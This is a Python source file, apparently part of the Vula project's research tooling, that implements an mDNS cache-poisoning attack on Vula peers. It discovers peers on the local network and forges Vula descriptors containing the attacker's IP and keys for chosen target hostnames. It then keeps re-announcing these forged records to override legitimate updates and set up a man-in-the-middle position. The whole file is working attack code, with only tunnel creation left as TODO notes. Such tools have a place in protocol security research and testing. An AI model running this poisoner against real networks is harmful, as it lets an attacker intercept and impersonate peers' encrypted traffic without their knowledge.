"""
discovers active vula peer and poisons vula peer cache for specified hosts
"""
import logging
import click
from ipaddress import IPv4Address
from zeroconf import ServiceBrowser, Zeroconf, ServiceInfo, IPVersion
from vula.mitm.forge_descriptor import (
    VulaKeys,
    forge_descriptor,
    serialize_forged_descriptor,
)

LABEL = '_opabinia._udp.local.'
PORT = 5354

logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)
ch = logging.StreamHandler()
ch.setLevel(logging.DEBUG)
logger.addHandler(ch)


def extract_hostname_from_descriptor(descriptor) -> str:
    """
    extract hostname from Vula descriptor
    >>> descriptor = {
    ...     b'port': b'5354', b'hostname': b'pc.local.', b'e': b'False'}
    >>> extract_hostname_from_descriptor(descriptor)
    'pc.local.'
    """
    return descriptor[b'hostname'].decode('utf-8')


def extract_ip_from_descriptor(descriptor) -> str:
    """
    extract hostname from Vula descriptor
    >>> descriptor = {b'addrs': b'10.123.128.250', b'vf': b'1637779299'}
    >>> extract_ip_from_descriptor(descriptor)
    IPv4Address('10.123.128.250')
    """
    return IPv4Address(descriptor[b'addrs'].decode('utf-8'))


def remove_hostname_domain(name: str) -> str:
    """
    returns hostname without domain suffix

    >>> remove_hostname_domain("pc.local.")
    'pc'
    >>> remove_hostname_domain("nouti._opabinia._udp.local.")
    'nouti'
    """
    return name.split(".")[0]


class MdnsPoisonException(Exception):
    pass


class MdnsPoisonParticipantExistsException(MdnsPoisonException):
    pass


class MdnsPoisonParticipantNotInterestingException(MdnsPoisonException):
    pass


class MdnsPoisonParticipantNotExistsException(MdnsPoisonException):
    pass


class MdnsPoison:
    """
    Vula MDNS poisoner class based on zeroconf's ServiceBrowser

    tracks and updates internal state save in self.participants
    each entry in the participants-dictionary is
    addressed by hostname (without any domain suffix)
    and consists of:
    - ip: IP address as IPv4Address object
    - descriptor: original (non-forged) Vula descriptor
    - forged_descriptor:
        forged Vula descriptor containing the poisoner's IP and Vula keys
    - info: zeroconf ServiceInfo object containing the forged information
    """

    def __init__(
        self, participants: list, ip: IPv4Address, vula_keys: VulaKeys
    ) -> None:
        """
        :param participants: hostnames to be MITM'd
        :param ip: IP of the host MITMing the participants
        :param vula_keys: VulaKeys object
        """
        self.participants = {}
        for participant in participants:
            self.participants[participant] = None
        self.ip = ip
        # VulaKeys is not initialized here because it takes a considerable
        # amount of time and the zeroconf library calls the add_service method
        # before the keys are ready
        self.vula_keys = vula_keys
        self.zeroconf = Zeroconf(ip_version=IPVersion.V4Only)
        self.browser = ServiceBrowser(self.zeroconf, LABEL, self)

    def __add_participant(
        self, hostname: str, ip: IPv4Address, descriptor: dict
    ) -> None:
        """
        adds participant information to internal state
        (if hostname is marked as interesting)

        :param hostname: hostname
        :param ip: ip
        :param descriptor: vula descriptor (not forged)
        :raises MdnsPoisonParticipantNotInterestingException:
            host isn't marked as interesting
        :raises MdnsPoisonParticipantExistsException:
            information already known, use __update_participant() instead
        """
        if hostname not in self.participants:
            raise MdnsPoisonParticipantNotInterestingException
        if self.participants[hostname] is not None:
            raise MdnsPoisonParticipantExistsException
        self.participants[hostname] = {
            "ip": ip,
            "descriptor": descriptor,
        }
        self.participants[hostname]["forged_descriptor"] = forge_descriptor(
            self.vula_keys, str(self.ip), f"{hostname}.local.", PORT
        )
        self.participants[hostname]["info"] = ServiceInfo(
            LABEL,
            name=f"{hostname}.{LABEL}",
            port=int(PORT),
            addresses=[self.ip.packed],
            properties=serialize_forged_descriptor(
                self.participants[hostname]["forged_descriptor"]
            ),
            server=f"{hostname}.local.",
        )
        logger.info(f"Vula Peer {hostname} ({ip}) added")

    def __update_participant(
        self, hostname: str, ip: IPv4Address, descriptor
    ) -> bool:
        """
        update participant information in internal state
        (if hostname is marked as interesting)

        :param hostname: hostname
        :param ip: ip
        :param descriptor: vula descriptor (not forged)
        :raises MdnsPoisonParticipantNotInterestingException:
            host isn't marked as interesting
        :raises MdnsPoisonParticipantNotExistsException: information not yet
            known, use __add_participant() instead
        :return: True if ip or descriptor has changed, False otherwise
        """
        if hostname not in self.participants:
            raise MdnsPoisonParticipantNotInterestingException
        if self.participants[hostname] is None:
            raise MdnsPoisonParticipantNotExistsException
        changed = False
        if ip != self.participants[hostname]["ip"]:
            changed = True
            self.participants[hostname]["ip"] = ip
        if descriptor != self.participants[hostname]["descriptor"]:
            changed = True
            self.participants[hostname]["descriptor"] = descriptor
        logger.info(f"\nVula Peer {hostname} ({ip}) updated")
        return changed

    def __handle_new_vula_peer(self, hostname: str) -> None:
        """
        registers MDNS service (sends out MDNS record)

        :param hostname: hostname of updated peer
        """
        self.zeroconf.register_service(
            self.participants[hostname]["info"],
            # needed to force zeroconf to allow
            # multiple hosts announcing the same service
            cooperating_responders=True,
        )
        self.zeroconf.send

        # TODO: trigger tunnel creation

    def __handle_updated_vula_peer(self, hostname: str, changed: bool) -> None:
        """
        sends out MDNS update

        :param hostname: hostname of updated peer
        :param changed: nothing yet
        """
        # always send an update to overwrite legitimate update
        self.zeroconf.update_service(self.participants[hostname]["info"])

        # TODO: trigger tunnel creation/modification
        # if changed:

    def add_service(self, zeroconf, type, name) -> None:
        """
        MDNS poisoning logic for newly discovered MDNS records on the network
        function called by zeroconf ServiceBrowser
        """
        descriptor = zeroconf.get_service_info(type, name).properties
        try:
            hostname = extract_hostname_from_descriptor(descriptor)
            hostname_without_domain = remove_hostname_domain(name)
            ip = extract_ip_from_descriptor(descriptor)
        except KeyError:
            # not a Vula MDNS message
            return
        try:
            self.__add_participant(hostname_without_domain, ip, descriptor)
            self.__handle_new_vula_peer(hostname_without_domain)
        except MdnsPoisonParticipantNotInterestingException:
            logger.debug(
                f"Vula peer {hostname} not marked as interesting, "
                "nothing to add"
            )
        except MdnsPoisonParticipantExistsException:
            logger.error(
                f"\nVula Peer {hostname} is already known and "
                "shouldn't be added again"
            )

    def update_service(self, zeroconf, type, name) -> None:
        """
        MDNS poisoning logic for updated mdns records on the network
        function called by zeroconf ServiceBrowser
        """
        # parse MDNS information
        descriptor = zeroconf.get_service_info(type, name).properties
        try:
            hostname = extract_hostname_from_descriptor(descriptor)
            hostname_without_domain = remove_hostname_domain(name)
            ip = extract_ip_from_descriptor(descriptor)
        except KeyError:
            # not a Vula MDNS message
            return

        if ip == self.ip:
            # MDNS message created by us -> ignore
            return

        try:
            updated = self.__update_participant(
                hostname_without_domain, ip, descriptor
            )
            self.__handle_updated_vula_peer(hostname_without_domain, updated)
        except MdnsPoisonParticipantNotInterestingException:
            logger.debug(
                f"Vula peer {hostname} not marked as interesting, "
                "nothing to update"
            )
        except MdnsPoisonParticipantNotExistsException:
            logger.error(
                f"\nVula Peer {hostname} isn't known yet "
                "and shouldn't be updated"
            )

    def remove_service(self, zeroconf, type, name) -> None:
        """
        MDNS poisoning logic for removed mdns records on the network
        function called by zeroconf ServiceBrowser
        """
        hostname_without_domain = remove_hostname_domain(name)
        # vula currently doesn't remove mdns records when stopping
        # -> internal state doesn't has to be updated
        self.zeroconf.unregister_service(
            self.participants[hostname_without_domain]["info"]
        )

    def close(self) -> None:
        self.zeroconf.close()
        logger.info("poisoner closed")


@click.command()
@click.option(
    "--ip",
    required=True,
    type=str,
    help="IP of host poisoning the vula peer cache",
)
@click.option(
    "--interesting-hosts",
    required=True,
    type=str,
    help="hostnames to poison, without domain suffix, separated by \",\"",
)
def main(ip: str, interesting_hosts: str):
    # parse and check arguments
    input_ip = IPv4Address(ip)
    participants = interesting_hosts.split(",")
    for participant in participants:
        if 1 != len(participant.split(".")):
            raise ValueError(
                "hosts in --interesting-hosts must be supplied "
                "without domain suffix, "
                "e.g. host instead of host.local"
            )

    # generate Vula keys
    logger.info("generating Vula keys, this can take a while...")
    vula_keys = VulaKeys()
    logger.info("Vula keys generated")

    # start poisoner
    logger.info("starting MDNS poisoner...")
    poisoner = MdnsPoison(participants, input_ip, vula_keys)
    logger.info("MDNS poisoner started")

    try:
        input("Press enter to exit...\n\n")
    finally:
        poisoner.close()


if __name__ == "__main__":
    main()
